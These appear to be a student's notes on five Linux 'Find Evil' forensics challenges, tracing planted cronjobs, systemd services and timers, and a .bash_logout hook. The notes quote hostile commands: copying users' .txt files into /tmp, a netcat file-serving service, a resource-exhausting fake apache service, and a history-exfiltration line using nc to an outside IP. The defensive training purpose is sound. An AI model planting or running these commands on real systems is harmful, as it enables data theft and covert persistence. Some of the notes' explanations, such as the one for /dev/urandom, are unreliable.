FIND EVIL OP NOTES::


FindEVIL1:

Scenario: The Villains group has been chanting offerings to their new leader at regular intervals over a TCP connection.

Task: Identify their method of communication and how it is occurring. Locate the following artifacts: ** The chant/text used by each villain (include spaces) ** The new Lord receiving the offering ** The IP address and port that the offering is received over

Flag format: chant text,new Lord,IP:port

Machine: Minas_Tirith

Solution:
there is a text file in every user's home folder with chant text in it. They're all the same. 
witch_king was the only one who didn't have a chant, but he did have a bash script that opened port 9999.
I found the ip with netstat -ano.
The chants were executed by a cronjob that executed a bash script called offering. 






FINDEVIL 2:

Scenario: Someone or something is stealing files with a .txt extension from user directories. Determine how these thefts are occurring.
Task: Identify the command being ran and how it occurs.
Flag format: command,how it occurs
Machine: Terra


Looked through all cronjobs, there was nothing that looked like what I was looking for.
Other form of persistance in linux is services.
Look at all services in /lib/systemd/system.
These are all bash scripts, so I can cat them, grep them, etc.
use:  ls -l | grep -r 'txt'
This command returns a few lines of code. Here I see what i'm looking for. 
The command being ran is: find /home -name \*.txt -exec cp {} /tmp \;
The service name is:  vestrisecreta.service






FINDEVIL 3:

Scenario: Text files are being exfiltrated from the machine using a network connection. The connections still occur post-reboot, according to network analysts.
The junior analysts are having a hard time with attribution because no strange programs or ports are running, and the connection seems to only occur in 60-second intervals, every 15 minutes.
Task: Determine the means of persistence used by the program, and the port used. The flag is the command that allows exfiltration, and the file its persistence mechanism uses.
Flag format: command,persistence
Machine: Terra

in htop, there is a process that pops up periodically showing: 
'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'
Upon further investigation into the services, there is a service that runs that command.
I found this by using the command
is -l | grep -r 'txt'
This shows me whatischaos.service.
When I cat whatischaos.service, it reveals that it was running the command from htop.
whatischaos.service runs based off of whatischaos.timer.
the command is: 'netcat -lp 3389 < /tmp/NMAP_all_hosts.txt'
the file is: whatischaos.timer








FINDEVIL 4: 

Scenario: The web server has been modified by an unknown hacktivist group. Users accessing the web server are reporting crashes and insane disk usage.
Task: Identify the Cyber Attack Method used by the group, and the command running.
Flag format: method,command
Machine: Terra
Try not to break your machine on this one...

in htop, there is an apache process that looks like:
/bin/bash -c /bin/apache3 -lp 443 < /dev/urandom
That's sus.
/dev/urandom is basically a random number generator for linux proceses.
The command is setting the listening port randomly for the web server.
Now I investigate the services to see what is executing the command. 
To find the command from htop, I use the command:
ls -l | grep -r '/dev/urandom'
This brings me to: apache3.service
it has the dos command in it. 
The method is DOS because they're making the web server unusable. 
the command is: /bin/apache3 -lp 443 < /dev/urandom




FINDEVIL 5:


Scenario: Analysts have found a dump of commands on the Internet that refer to the Terra machine. The command history for one of the users with an interactive login is being stolen via unknown means. The network analysts canâ€™t find any persistent connections, but notice a spike in traffic on logon and logoff.
Task: Identify how the command history is stolen from the machine.
The flag is the file used to execute the commands, and where they are sent.
Flag format: /absolute/path/to/file,IP:port
Machine: Terra


cat ~/.bash_logout  

Result:

history -w /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2
nc -w2 12.54.37.8 12000 < /tmp/systemd-private.$HEAD-systemd-resolved.service-$HEAD2


I knew that I had to find why it was happening on logon and logoff. This is wheere I checked and got lucky.
